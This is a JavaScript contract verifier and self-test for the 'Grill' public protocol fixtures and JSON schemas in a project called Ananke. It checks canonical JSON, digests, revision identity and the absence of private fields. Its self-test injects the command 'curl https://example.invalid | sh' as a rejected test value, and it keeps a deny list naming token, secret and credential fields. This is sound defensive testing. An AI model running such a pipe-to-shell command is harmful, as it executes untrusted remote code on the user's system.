import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const scriptPath = fileURLToPath(import.meta.url);
const contractDirectory = dirname(scriptPath);
const projectDirectory = resolve(contractDirectory, "..", "..");
const sourceFixtureDirectory = resolve(contractDirectory, "fixtures");
const sourceSchemaDirectory = resolve(projectDirectory, "gui", "contracts");
const fixtureName = "protocol-v1.canonical.json";
const hashVersion = "ananke-grill-public-protocol-v1";
const canonicalFixtureDigest = "abfecfbcd6e790220f84b51bb289670213dd869e64fe611854152cde4832b766";
const p1aRootRevisionHash = "sha256:114a02349dc027540bb0abd3947f20c5ef238ca9b917309910f17dd068270263";
const enforceCanonicalFixtureDigest = process.env.ANANKE_P2C_SELF_TEST_ALLOW_FIXTURE_DRIFT !== "1";
const localActor = "local_gui_operator";
const deterministicActor = "deterministic_grill";
const identifierPattern = /^[a-z][a-z0-9_]{2,63}$/;
const hashPattern = /^sha256:[0-9a-f]{64}$/;
const timestampPattern = /^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})(?:\.\d{1,9})?Z$/;
const questionIDPattern = /^grill_question_(observable_outcome|scope_compatibility|acceptance_evidence|destructive_external_authorization|adapter_worktree_isolation|autonomy_budget)$/;

const revisionIdentity = {
  proposal_id: "proposal_p1a_001",
  revision: 1,
  revision_hash: p1aRootRevisionHash,
};

const ruleSpecs = [
  { blocking: true, default: "needs_rewrite", remedial_step: "declare_observable_outcome", risk: "high", rule_class: "observable_outcome", waivable: false },
  { blocking: true, default: "needs_rewrite", remedial_step: "declare_scope_compatibility", risk: "medium", rule_class: "scope_compatibility", waivable: true },
  { blocking: true, default: "needs_rewrite", remedial_step: "declare_acceptance_evidence", risk: "high", rule_class: "acceptance_evidence", waivable: false },
  { blocking: true, default: "deny", remedial_step: "record_local_authorization", risk: "critical", rule_class: "destructive_external_authorization", waivable: false },
  { blocking: true, default: "needs_rewrite", remedial_step: "require_isolated_worktree", risk: "high", rule_class: "adapter_worktree_isolation", waivable: false },
  { blocking: true, default: "needs_rewrite", remedial_step: "set_deadline_attempt_cap", risk: "high", rule_class: "autonomy_budget", waivable: false },
];
const questionIDs = Object.fromEntries(ruleSpecs.map(({ rule_class: ruleClass }) => [ruleClass, `grill_question_${ruleClass}`]));

const schemaDocuments = [
  { key: "evaluateInput", file: "renderer-public-grill-evaluate-input.schema.json", title: "EvaluateGrillInput", digest: "7e9dbcd9ae7c93e774d7a3fd5ca41404e993f07839e5e1381cf53e1efb440f35" },
  { key: "defaultInput", file: "renderer-public-grill-record-default-input.schema.json", title: "RecordGrillDefaultInput", digest: "fa7c4a395581975e1892fe4db5bfec575bc0d5d47b83eb26704290e30b54acd2" },
  { key: "answerInput", file: "renderer-public-grill-record-answer-input.schema.json", title: "RecordGrillAnswerInput", digest: "c2d484b07ad5dd340402380a0b3ed9e997d6d55e0829f0b9d1906feec5969adb" },
  { key: "overrideInput", file: "renderer-public-grill-record-override-input.schema.json", title: "RecordGrillOverrideInput", digest: "6abd1c297a0264ee0345edc40ef07464b4ddb4a263033ec691aefae9063557c9" },
  { key: "evaluation", file: "renderer-public-grill-evaluation.schema.json", title: "GrillEvaluation", digest: "d8b6a70a5c827c78019184f9fcbdeb103888e6903a52ea5deeaf86510ceae51a" },
  { key: "defaultRecord", file: "renderer-public-grill-default-record.schema.json", title: "GrillDefaultRecord", digest: "7b1e38318447eb0ea0c6e493aace6a4e4bbd106fe7b29a18c5417a00f2f9638b" },
  { key: "answerRecord", file: "renderer-public-grill-answer-record.schema.json", title: "GrillAnswerRecord", digest: "88527710a1f4898bf875a7aeab561f5ef2b6ef2a2ce8b64cb235cab90006c616" },
  { key: "overrideRecord", file: "renderer-public-grill-override-record.schema.json", title: "GrillOverrideRecord", digest: "e74537b0dd830543eddfc5a5ac29d0af9219365115353394479813c9cb9c702a" },
];

const schemaTargets = [
  { name: "EvaluateGrillInput", document: "evaluateInput", select: (schema) => schema },
  { name: "RecordGrillDefaultInput", document: "defaultInput", select: (schema) => schema },
  { name: "RecordGrillAnswerInput", document: "answerInput", select: (schema) => schema },
  { name: "RecordGrillOverrideInput", document: "overrideInput", select: (schema) => schema },
  { name: "GrillEvaluation", document: "evaluation", select: (schema) => schema },
  { name: "GrillQuestion", document: "evaluation", select: (schema) => schema.properties.shown_questions.items },
  { name: "GrillDefaultRecord", document: "defaultRecord", select: (schema) => schema },
  { name: "GrillAnswerRecord", document: "answerRecord", select: (schema) => schema },
  { name: "GrillOverrideRecord", document: "overrideRecord", select: (schema) => schema },
];

const commandSpecs = [
  { name: "evaluate_grill", daemon: "evaluate-grill", input: "evaluateInput", result: "evaluation" },
  { name: "record_grill_default", daemon: "record-grill-default", input: "defaultInput", result: "defaultRecord" },
  { name: "record_grill_answer", daemon: "record-grill-answer", input: "answerInput", result: "answerRecord" },
  { name: "record_grill_override", daemon: "record-grill-override", input: "overrideInput", result: "overrideRecord" },
];

const privateFieldFragments = [
  "cmd", "command", "token", "error", "socket", "identity", "worker", "process", "pid", "path", "root",
  "secret", "credential", "password", "model", "prompt", "prose", "approval", "execution", "execute", "runtime",
  "transport", "inputhash", "ruleversion", "declarations", "raw",
];
const supportedSchemaKeywords = new Set([
  "$schema", "$id", "title", "description", "type", "additionalProperties", "required", "properties", "pattern",
  "minimum", "maximum", "minItems", "maxItems", "items", "const", "enum", "x-ananke-utc-timestamp",
]);

function optionValue(name) {
  const index = process.argv.indexOf(name);
  if (index === -1) return undefined;
  assert.ok(process.argv[index + 1], `${name} requires a value`);
  return process.argv[index + 1];
}

function expectObject(value, name) {
  assert.ok(value !== null && typeof value === "object" && !Array.isArray(value), `${name} must be an object`);
}

function expectKeys(value, expected, name) {
  expectObject(value, name);
  assert.deepEqual(Object.keys(value).sort(), [...expected].sort(), `${name} fields`);
}

function assertNoUnpairedSurrogates(value, path = "$") {
  if (typeof value === "string") {
    for (let index = 0; index < value.length; index += 1) {
      const codeUnit = value.charCodeAt(index);
      if (codeUnit >= 0xd800 && codeUnit <= 0xdbff) {
        const next = value.charCodeAt(index + 1);
        assert.ok(next >= 0xdc00 && next <= 0xdfff, `unpaired Unicode surrogate at ${path}[${index}]`);
        index += 1;
      } else {
        assert.ok(codeUnit < 0xdc00 || codeUnit > 0xdfff, `unpaired Unicode surrogate at ${path}[${index}]`);
      }
    }
    return;
  }
  if (Array.isArray(value)) {
    value.forEach((entry, index) => assertNoUnpairedSurrogates(entry, `${path}[${index}]`));
    return;
  }
  if (value === null || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    assertNoUnpairedSurrogates(key, `${path}.{key}`);
    assertNoUnpairedSurrogates(entry, `${path}.${key}`);
  }
}

function canonicalJson(value) {
  if (value === null) return "null";
  if (typeof value === "boolean") return value ? "true" : "false";
  if (typeof value === "string") return JSON.stringify(value);
  if (typeof value === "number") {
    assert.ok(Number.isFinite(value), "canonical JSON forbids non-finite numbers");
    return JSON.stringify(value);
  }
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(",")}]`;
  assert.equal(typeof value, "object", `unsupported canonical JSON value: ${typeof value}`);
  assert.equal(Object.getPrototypeOf(value), Object.prototype, "canonical JSON requires plain objects");
  return `{${Object.keys(value).sort().map((key) => `${JSON.stringify(key)}:${canonicalJson(value[key])}`).join(",")}}`;
}

function digest(value) {
  return createHash("sha256").update(value).digest("hex");
}

function assertIdentifier(value, name) {
  assert.ok(typeof value === "string" && identifierPattern.test(value), `${name} must be an identifier`);
}

function assertHash(value, name) {
  assert.ok(typeof value === "string" && hashPattern.test(value), `${name} must be a SHA-256 hash`);
}

function assertPositiveInteger(value, name) {
  assert.ok(Number.isInteger(value) && value > 0, `${name} must be a positive integer`);
}

function assertTimestamp(value, name) {
  const message = `${name} must be a semantic UTC RFC 3339/RFC3339Nano timestamp`;
  assert.ok(typeof value === "string", message);
  const match = timestampPattern.exec(value);
  assert.ok(match, message);
  const [year, month, day, hour, minute, second] = match.slice(1).map(Number);
  const daysInMonth = month === 2
    ? (year % 4 === 0 && (year % 100 !== 0 || year % 400 === 0) ? 29 : 28)
    : (month === 4 || month === 6 || month === 9 || month === 11 ? 30 : 31);
  assert.ok(month >= 1 && month <= 12 && day >= 1 && day <= daysInMonth && hour <= 23 && minute <= 59 && second <= 59, message);
}

function assertIdentity(value, name) {
  expectObject(value, name);
  assertIdentifier(value.proposal_id, `${name}.proposal_id`);
  assertPositiveInteger(value.revision, `${name}.revision`);
  assertHash(value.revision_hash, `${name}.revision_hash`);
  assert.deepEqual(
    { proposal_id: value.proposal_id, revision: value.revision, revision_hash: value.revision_hash },
    revisionIdentity,
    `${name} must bind the frozen P1a Revision identity`,
  );
}

function normalizeField(key) {
  return key.toLowerCase().replace(/[^a-z0-9]/g, "");
}

function isPrivateField(key, path) {
  if (key === "commands" && path === "$") return false;
  if (key === "input" && /^\$\.commands\.[a-z_]+$/.test(path)) return false;
  const normalized = normalizeField(key);
  return privateFieldFragments.some((fragment) => normalized.includes(fragment));
}

function assertPublicField(key, path, kind) {
  assert.ok(!isPrivateField(key, path), `private ${kind} field ${path}.${key} is not allowlisted`);
}

function assertNoPrivateFields(value, path = "$") {
  if (Array.isArray(value)) {
    value.forEach((entry, index) => assertNoPrivateFields(entry, `${path}[${index}]`));
    return;
  }
  if (value === null || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    assertPublicField(key, path, "fixture");
    assertNoPrivateFields(entry, `${path}.${key}`);
  }
}

function assertNoPrivateSchemaFields(schema, path) {
  if (schema === null || typeof schema !== "object") return;
  if (schema.properties !== undefined) {
    expectObject(schema.properties, `${path}.properties`);
    for (const [field, property] of Object.entries(schema.properties)) {
      assertPublicField(field, path, "schema");
      assertNoPrivateSchemaFields(property, `${path}.${field}`);
    }
  }
  if (schema.items !== undefined) assertNoPrivateSchemaFields(schema.items, `${path}[]`);
}

function typeMatches(value, type) {
  if (type === "null") return value === null;
  if (type === "array") return Array.isArray(value);
  if (type === "object") return value !== null && typeof value === "object" && !Array.isArray(value);
  if (type === "string") return typeof value === "string";
  if (type === "integer") return Number.isInteger(value);
  if (type === "number") return typeof value === "number" && Number.isFinite(value);
  if (type === "boolean") return typeof value === "boolean";
  throw new Error(`unsupported JSON Schema type ${type}`);
}

function validateSchema(value, schema, path) {
  if (schema.const !== undefined) assert.deepEqual(value, schema.const, `${path} const`);
  if (schema.enum !== undefined) assert.ok(schema.enum.some((candidate) => Object.is(candidate, value)), `${path} enum`);
  if (schema.type !== undefined) {
    const allowed = Array.isArray(schema.type) ? schema.type : [schema.type];
    assert.ok(allowed.some((type) => typeMatches(value, type)), `${path} type`);
  }
  if (typeof value === "string") {
    if (schema.pattern !== undefined) assert.match(value, new RegExp(schema.pattern), `${path} pattern`);
    if (schema["x-ananke-utc-timestamp"] === true) assertTimestamp(value, path);
  }
  if (typeof value === "number") {
    if (schema.minimum !== undefined) assert.ok(value >= schema.minimum, `${path} minimum`);
    if (schema.maximum !== undefined) assert.ok(value <= schema.maximum, `${path} maximum`);
  }
  if (Array.isArray(value)) {
    if (schema.minItems !== undefined) assert.ok(value.length >= schema.minItems, `${path} minimum item count`);
    if (schema.maxItems !== undefined) assert.ok(value.length <= schema.maxItems, `${path} maximum item count`);
    if (schema.items !== undefined) value.forEach((item, index) => validateSchema(item, schema.items, `${path}[${index}]`));
  }
  if (value !== null && typeof value === "object" && !Array.isArray(value) && schema.properties !== undefined) {
    for (const required of schema.required ?? []) assert.ok(Object.hasOwn(value, required), `${path} missing required property ${required}`);
    if (schema.additionalProperties === false) {
      for (const key of Object.keys(value)) assert.ok(Object.hasOwn(schema.properties, key), `${path}.${key} has unexpected property`);
    }
    for (const [key, propertySchema] of Object.entries(schema.properties)) {
      if (Object.hasOwn(value, key)) validateSchema(value[key], propertySchema, `${path}.${key}`);
    }
  }
}

function assertClosedSchemaNode(schema, path) {
  expectObject(schema, path);
  for (const key of Object.keys(schema)) assert.ok(supportedSchemaKeywords.has(key), `${path} uses unsupported schema keyword ${key}`);
  if (schema["x-ananke-utc-timestamp"] !== undefined) assert.equal(schema["x-ananke-utc-timestamp"], true, `${path} UTC timestamp marker`);
  if (schema.type !== undefined) {
    const types = Array.isArray(schema.type) ? schema.type : [schema.type];
    types.forEach((type) => assert.ok(["null", "array", "object", "string", "integer", "number", "boolean"].includes(type), `${path} schema type`));
    if (types.includes("object")) {
      expectObject(schema.properties, `${path}.properties`);
      assert.equal(schema.additionalProperties, false, `${path} must close object properties`);
      assert.ok(Array.isArray(schema.required), `${path}.required must be an array`);
      assert.deepEqual([...schema.required].sort(), Object.keys(schema.properties).sort(), `${path} required properties`);
    }
  }
  if (schema.minimum !== undefined) assert.ok(Number.isInteger(schema.minimum), `${path} integer minimum`);
  if (schema.maximum !== undefined) assert.ok(Number.isInteger(schema.maximum), `${path} integer maximum`);
  if (schema.minItems !== undefined) assert.ok(Number.isInteger(schema.minItems) && schema.minItems >= 0, `${path} minimum item count`);
  if (schema.maxItems !== undefined) assert.ok(Number.isInteger(schema.maxItems) && schema.maxItems >= 0, `${path} maximum item count`);
  if (schema.items !== undefined) assertClosedSchemaNode(schema.items, `${path}[]`);
  if (schema.properties !== undefined) {
    expectObject(schema.properties, `${path}.properties`);
    for (const [field, property] of Object.entries(schema.properties)) assertClosedSchemaNode(property, `${path}.${field}`);
  }
}

function verifySchemaDocument(schema, specification) {
  expectKeys(schema, ["$schema", "$id", "additionalProperties", "description", "properties", "required", "title", "type"], specification.file);
  assert.equal(schema.$schema, "https://json-schema.org/draft/2020-12/schema", `${specification.file} draft`);
  assert.equal(schema.$id, `https://ananke.local/contracts/${specification.file}`, `${specification.file} identifier`);
  assert.equal(schema.title, specification.title, `${specification.file} title`);
  assertClosedSchemaNode(schema, specification.file);
  assertNoPrivateSchemaFields(schema, specification.file);
  assert.equal(digest(Buffer.from(canonicalJson(schema), "utf8")), specification.digest, `${specification.file} contract digest`);
}

async function readSchemas(directory) {
  const entries = await Promise.all(schemaDocuments.map(async (specification) => {
    const bytes = await readFile(join(directory, specification.file));
    assert.ok(!bytes.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf])), `${specification.file} has a UTF-8 BOM`);
    const text = bytes.toString("utf8");
    assert.ok(Buffer.from(text, "utf8").equals(bytes), `${specification.file} is not UTF-8`);
    const schema = JSON.parse(text);
    assertNoUnpairedSurrogates(schema, specification.file);
    verifySchemaDocument(schema, specification);
    return [specification.key, schema];
  }));
  const schemas = new Map(entries);
  assert.equal(schemaTargets.length, 9, "P2c public DTO schema target inventory");
  for (const target of schemaTargets) {
    const selected = target.select(schemas.get(target.document));
    expectObject(selected, `${target.name} schema target`);
    assertClosedSchemaNode(selected, `${target.name} schema target`);
  }
  return schemas;
}

async function readManifest(directory) {
  const text = await readFile(join(directory, "fixtures.sha256"), "utf8");
  assert.ok(!text.endsWith("\n"), "fixtures.sha256 must not end with a newline");
  const match = text.match(/^([a-z0-9-]+) sha256 ([0-9a-f]{64}) ([a-z0-9.-]+)$/);
  assert.ok(match, `invalid hash manifest: ${text}`);
  assert.equal(match[1], hashVersion, "fixture hash version");
  assert.equal(match[3], fixtureName, "fixture hash manifest inventory");
  return match[2];
}

async function readCanonicalFixture(directory, manifestDigest) {
  const bytes = await readFile(join(directory, fixtureName));
  assert.equal(digest(bytes), manifestDigest, "fixture digest mismatch");
  if (enforceCanonicalFixtureDigest) assert.equal(digest(bytes), canonicalFixtureDigest, "canonical fixture digest mismatch");
  assert.ok(!bytes.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf])), `${fixtureName} has a UTF-8 BOM`);
  const text = bytes.toString("utf8");
  assert.ok(Buffer.from(text, "utf8").equals(bytes), `${fixtureName} is not UTF-8`);
  const value = JSON.parse(text);
  assertNoUnpairedSurrogates(value);
  assert.equal(text, canonicalJson(value), `${fixtureName} is not canonical JCS bytes`);
  return value;
}

function assertQuestion(question, expectedRule, expectedQuestionSequence) {
  expectKeys(question, ["blocking", "default", "proposal_id", "question_id", "question_sequence", "record_sequence", "remedial_step", "revision", "revision_hash", "risk", "rule_class", "waivable", "written_at", "written_by"], `question ${expectedQuestionSequence}`);
  assertIdentity(question, `question ${expectedQuestionSequence}`);
  assert.ok(questionIDPattern.test(question.question_id), `question ${expectedQuestionSequence}.question_id`);
  assert.deepEqual(
    {
      blocking: question.blocking,
      default: question.default,
      remedial_step: question.remedial_step,
      risk: question.risk,
      rule_class: question.rule_class,
      waivable: question.waivable,
    },
    expectedRule,
    `question ${expectedQuestionSequence} fixed P2a rule fields`,
  );
  assert.equal(question.question_id, questionIDs[question.rule_class], `question ${expectedQuestionSequence}.question_id link`);
  assert.equal(question.question_sequence, expectedQuestionSequence, `question ${expectedQuestionSequence}.question_sequence`);
  assert.equal(question.record_sequence, expectedQuestionSequence, `question ${expectedQuestionSequence}.record_sequence`);
  assertTimestamp(question.written_at, `question ${expectedQuestionSequence}.written_at`);
  assert.equal(question.written_by, deterministicActor, `question ${expectedQuestionSequence}.written_by`);
}

function verifyProtocol(value, schemas) {
  assertNoPrivateFields(value);
  expectKeys(value, ["commands", "schema_version"], "P2c protocol fixture");
  assert.equal(value.schema_version, "ananke.grill-public-protocol.v1", "P2c protocol schema version");
  expectKeys(value.commands, commandSpecs.map(({ name }) => name), "P2c command mapping");

  for (const specification of commandSpecs) {
    const vector = value.commands[specification.name];
    expectKeys(vector, ["input", "result"], `${specification.name} vector`);
    validateSchema(vector.input, schemas.get(specification.input), `${specification.name}.input`);
    validateSchema(vector.result, schemas.get(specification.result), `${specification.name}.result`);
  }

  const evaluation = value.commands.evaluate_grill;
  const defaultRecord = value.commands.record_grill_default;
  const answerRecord = value.commands.record_grill_answer;
  const overrideRecord = value.commands.record_grill_override;

  assertIdentity(evaluation.input, "evaluate input");
  assertIdentity(evaluation.result, "evaluation result");
  assert.equal(evaluation.result.status, "blocked", "golden evaluation status");
  assert.equal(evaluation.result.shown_questions.length, 5, "evaluation five-question display bound");
  assert.equal(evaluation.result.new_question_ids.length, 5, "evaluation five-question append bound");
  assert.equal(evaluation.result.deferred_rule_classes.length, 1, "evaluation one deferred rule");
  assert.equal(evaluation.result.new_records, 6, "evaluation appends one evaluation and five Questions");
  assert.ok(evaluation.result.new_records >= evaluation.result.new_question_ids.length, "evaluation record count includes Questions");
  assert.ok(evaluation.result.new_records <= 6, "evaluation record count remains bounded");
  assert.deepEqual(
    evaluation.result.shown_questions.map(({ rule_class: ruleClass }) => ruleClass),
    ruleSpecs.slice(0, 5).map(({ rule_class: ruleClass }) => ruleClass),
    "shown Questions retain frozen priority order",
  );
  assert.deepEqual(
    evaluation.result.new_question_ids,
    evaluation.result.shown_questions.map(({ question_id: questionID }) => questionID),
    "new Question IDs retain shown Question order",
  );
  assert.deepEqual(evaluation.result.deferred_rule_classes, ["autonomy_budget"], "sixth triggered rule is deferred");
  evaluation.result.shown_questions.forEach((question, index) => assertQuestion(question, ruleSpecs[index], index + 1));

  const records = [
    ["default", defaultRecord, "grill_question_scope_compatibility", 6, deterministicActor, "needs_rewrite"],
    ["answer", answerRecord, "grill_question_acceptance_evidence", 7, localActor, "acknowledged"],
    ["override", overrideRecord, "grill_question_scope_compatibility", 8, localActor, "waived"],
  ];
  for (const [kind, vector, questionID, sequence, actor, valueField] of records) {
    assertIdentity(vector.input, `${kind} input`);
    assertIdentity(vector.result, `${kind} result`);
    assert.equal(vector.input.question_id, questionID, `${kind} input question link`);
    assert.equal(vector.result.question_id, questionID, `${kind} result question link`);
    assert.equal(vector.result.record_sequence, sequence, `${kind} append-only record sequence`);
    assert.equal(vector.result.written_by, actor, `${kind} record actor`);
    assert.equal(vector.result[kind], valueField, `${kind} fixed record value`);
    assertTimestamp(vector.result.written_at, `${kind} record timestamp`);
  }
  assert.deepEqual(records.map(([, vector]) => vector.result.record_sequence), [6, 7, 8], "review actions append after ordered Questions");
  assert.equal(overrideRecord.input.question_id, questionIDs.scope_compatibility, "only the frozen waivable question is overridden");
  assert.equal(ruleSpecs.find(({ rule_class: ruleClass }) => ruleClass === "scope_compatibility").waivable, true, "override target remains waivable");
}

async function verify(fixturesDirectory, schemasDirectory) {
  const [manifestDigest, schemas] = await Promise.all([readManifest(fixturesDirectory), readSchemas(schemasDirectory)]);
  const fixture = await readCanonicalFixture(fixturesDirectory, manifestDigest);
  verifyProtocol(fixture, schemas);
}

async function rewriteManifest(directory) {
  const bytes = await readFile(join(directory, fixtureName));
  await writeFile(join(directory, "fixtures.sha256"), `${hashVersion} sha256 ${digest(bytes)} ${fixtureName}`);
}

async function readJsonFixture(directory) {
  return JSON.parse(await readFile(join(directory, fixtureName), "utf8"));
}

async function writeCanonicalFixture(directory, value) {
  await writeFile(join(directory, fixtureName), canonicalJson(value));
}

function runCopiedVerifier(fixturesDirectory, schemasDirectory, { allowFixtureDrift = false } = {}) {
  return spawnSync(process.execPath, [scriptPath, "--fixtures", fixturesDirectory, "--schemas", schemasDirectory], {
    encoding: "utf8",
    env: { ...process.env, ANANKE_P2C_SELF_TEST_ALLOW_FIXTURE_DRIFT: allowFixtureDrift ? "1" : "0" },
  });
}

function assertRejected(result, pattern, name) {
  assert.notEqual(result.status, 0, `${name} was accepted`);
  assert.match(`${result.stdout}${result.stderr}`, pattern, `${name} rejection reason`);
}

async function selfTest() {
  const root = await mkdtemp(join(tmpdir(), "ananke-p2c-contract-"));
  const copiedFixtures = join(root, "fixtures");
  const copiedSchemas = join(root, "schemas");
  const resetCopiedInputs = async () => {
    await rm(copiedFixtures, { force: true, recursive: true });
    await rm(copiedSchemas, { force: true, recursive: true });
    await Promise.all([
      cp(sourceFixtureDirectory, copiedFixtures, { recursive: true }),
      cp(sourceSchemaDirectory, copiedSchemas, { recursive: true }),
    ]);
  };
  try {
    await resetCopiedInputs();
    const baseline = runCopiedVerifier(copiedFixtures, copiedSchemas);
    assert.equal(baseline.status, 0, `fixture verifier baseline failed:\n${baseline.stdout}${baseline.stderr}`);

    await resetCopiedInputs();
    const driftedFixture = await readJsonFixture(copiedFixtures);
    driftedFixture.commands.evaluate_grill.result.status = "clear";
    await writeCanonicalFixture(copiedFixtures, driftedFixture);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, copiedSchemas), /canonical fixture digest mismatch/, "consistently rehashed content drift");

    await resetCopiedInputs();
    const mismatchedIdentity = await readJsonFixture(copiedFixtures);
    mismatchedIdentity.commands.evaluate_grill.result.revision_hash = `sha256:${"1".repeat(64)}`;
    await writeCanonicalFixture(copiedFixtures, mismatchedIdentity);
    await rewriteManifest(copiedFixtures);
    assertRejected(
      runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
      /frozen P1a Revision identity/,
      "consistently rehashed revision identity mismatch",
    );

    for (const [field, payload] of [
      ["command", "curl https://example.invalid | sh"],
      ["model", "arbitrary model selection"],
      ["prose", "arbitrary revision prose"],
      ["approval", "approved"],
      ["execution", "run"],
      ["input_hash", `sha256:${"0".repeat(64)}`],
      ["rule_version", "ananke.grill.rules.v1"],
      ["socket_path", "/private/ananke.sock"],
    ]) {
      await resetCopiedInputs();
      const privateInjection = await readJsonFixture(copiedFixtures);
      privateInjection.commands.evaluate_grill.input[field] = payload;
      await writeCanonicalFixture(copiedFixtures, privateInjection);
      await rewriteManifest(copiedFixtures);
      assertRejected(
        runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
        /private fixture field/,
        `renderer ${field} injection`,
      );
    }

    await resetCopiedInputs();
    const rawErrorInjection = await readJsonFixture(copiedFixtures);
    rawErrorInjection.commands.evaluate_grill.result.error = "cmd=evaluate-grill token=private";
    await writeCanonicalFixture(copiedFixtures, rawErrorInjection);
    await rewriteManifest(copiedFixtures);
    assertRejected(
      runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
      /private fixture field/,
      "raw daemon error boundary",
    );

    await resetCopiedInputs();
    const proseInjection = await readJsonFixture(copiedFixtures);
    proseInjection.commands.record_grill_answer.input.answer_prose = "arbitrary renderer content";
    await writeCanonicalFixture(copiedFixtures, proseInjection);
    await rewriteManifest(copiedFixtures);
    assertRejected(
      runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
      /private fixture field/,
      "renderer answer prose injection",
    );

    await resetCopiedInputs();
    const reorderedQuestions = await readJsonFixture(copiedFixtures);
    [reorderedQuestions.commands.evaluate_grill.result.shown_questions[0], reorderedQuestions.commands.evaluate_grill.result.shown_questions[1]] = [reorderedQuestions.commands.evaluate_grill.result.shown_questions[1], reorderedQuestions.commands.evaluate_grill.result.shown_questions[0]];
    [reorderedQuestions.commands.evaluate_grill.result.new_question_ids[0], reorderedQuestions.commands.evaluate_grill.result.new_question_ids[1]] = [reorderedQuestions.commands.evaluate_grill.result.new_question_ids[1], reorderedQuestions.commands.evaluate_grill.result.new_question_ids[0]];
    await writeCanonicalFixture(copiedFixtures, reorderedQuestions);
    await rewriteManifest(copiedFixtures);
    assertRejected(
      runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
      /shown Questions retain frozen priority order/,
      "stable Question ordering",
    );

    await resetCopiedInputs();
    const overBound = await readJsonFixture(copiedFixtures);
    overBound.commands.evaluate_grill.result.shown_questions.push(structuredClone(overBound.commands.evaluate_grill.result.shown_questions[4]));
    await writeCanonicalFixture(copiedFixtures, overBound);
    await rewriteManifest(copiedFixtures);
    assertRejected(
      runCopiedVerifier(copiedFixtures, copiedSchemas, { allowFixtureDrift: true }),
      /maximum item count/,
      "five-question display bound",
    );

    await resetCopiedInputs();
    const privateSchemaPath = join(copiedSchemas, "renderer-public-grill-evaluate-input.schema.json");
    const privateSchema = JSON.parse(await readFile(privateSchemaPath, "utf8"));
    privateSchema.properties.model_output = { type: "string" };
    privateSchema.required.push("model_output");
    await writeFile(privateSchemaPath, JSON.stringify(privateSchema));
    assertRejected(runCopiedVerifier(copiedFixtures, copiedSchemas), /private schema field/, "private schema field");
  } finally {
    await rm(root, { force: true, recursive: true });
  }
}

if (process.argv.includes("--self-test")) {
  await selfTest();
  console.log("P2c Grill self-test rejected frozen-fixture drift, revision-identity mismatch, command/model/prose/approval/execution/private-transport injection, raw daemon errors, unstable question ordering, five-question overflow, and private schema fields.");
} else {
  await verify(
    resolve(optionValue("--fixtures") ?? sourceFixtureDirectory),
    resolve(optionValue("--schemas") ?? sourceSchemaDirectory),
  );
  console.log("P2c Grill public protocol fixtures and 9 DTO schema targets verified.");
}
